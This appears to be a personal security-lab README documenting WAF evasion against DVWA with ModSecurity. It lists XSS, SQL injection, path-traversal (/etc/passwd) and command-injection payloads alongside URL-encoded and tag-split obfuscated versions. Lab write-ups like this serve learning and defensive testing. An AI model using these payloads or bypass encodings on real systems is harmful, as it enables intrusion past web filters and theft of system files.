# 🧬 Module 2 – Tool 3: Payload Obfuscation

## 🎯 Objective
Use obfuscated payloads to bypass WAF detection mechanisms and understand which encodings and evasion techniques are most effective.

---

## 🛠️ Tool Used
- Burp Suite (Community/Professional)
- Manual encoding tools (CyberChef, browser encoding plugins, etc.)

---

## 📍 Target
- **IP/URL:** http://192.168.1.110
- **Environment:** DVWA with ModSecurity WAF enabled

---

## 🧪 Payload Examples

| Type              | Original Payload                   | Obfuscated Payload                                     |
|-------------------|------------------------------------|--------------------------------------------------------|
| **XSS**           | `<script>alert(1)</script>`        | `<scr<script>ipt>alert(1)</scr</script>ipt>`          |
| **SQL Injection** | `' OR '1'='1`                      | `%27%20oR%20%271%27%3D%271`                            |
| **LFI**           | `../../etc/passwd`                 | `%2e%2e%2f%2e%2e%2fetc%2fpasswd`                       |
| **Command Inj.**  | `; ls -la`                         | `%3b%20ls%20-la`                                       |

---

## 📄 Output Files
- `payloads/original-vs-obfuscated.txt`  
  ➤ A comparison of original and encoded/obfuscated payloads

- `screenshots/waf-obfuscation-bypass.png`  
  ➤ Terminal screenshot of WAF behavior to obfuscated payloads

---

## 🧠 What I Learned
- How to transform malicious payloads using encodings
- Identified which payloads bypass specific WAF rules
- Importance of understanding filter logic before exploit attempts

---

## 🙋 About Me
I’m a SOC Analyst transitioning into Red Teaming, testing real-world WAF detection and bypass techniques.

🔗 [Connect on LinkedIn](https://www.linkedin.com/in/aditya-kumar-goswami)  
📁 GitHub: [Aditya-Sec](https://github.com/Aditya-Sec)
